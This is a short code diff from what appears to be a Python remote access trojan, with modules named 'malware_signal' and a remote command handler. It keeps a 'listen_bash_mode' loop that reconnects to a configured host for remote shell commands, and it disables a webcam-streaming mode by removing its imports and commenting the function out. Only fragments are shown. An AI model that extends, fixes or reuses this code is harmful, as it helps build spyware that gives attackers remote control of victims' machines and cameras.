@@ -4,8 +4,6 @@ from app.core.data.client import client_id, username
 from app.core.data.config import ROOM, HOST
 from app.malware_signal.signal import SignalClient
 from app.tools.tool_utilities.remote_command_handler import RemoteCommandHandler as ReceiverHandler
-from app.tools.media.web_cam import WebCam
-from app.malware_signal.peer import Peer
 
 async def listen_bash_mode():
     retry_delay = 10
@@ -28,7 +26,7 @@ async def listen_bash_mode():
         print(f"[!] RECONNECTING IN {retry_delay} seconds")
         await asyncio.sleep(retry_delay)
 
-async def listen_stream_mode():
+"""async def listen_stream_mode():
     print("[+] LISTENING STREAM MODE")
     retry_delay = 10
     while True:
@@ -80,4 +78,4 @@ async def listen_stream_mode():
                 if signal:
                     await signal.close()
             except Exception:
-                pass
+                pass"""
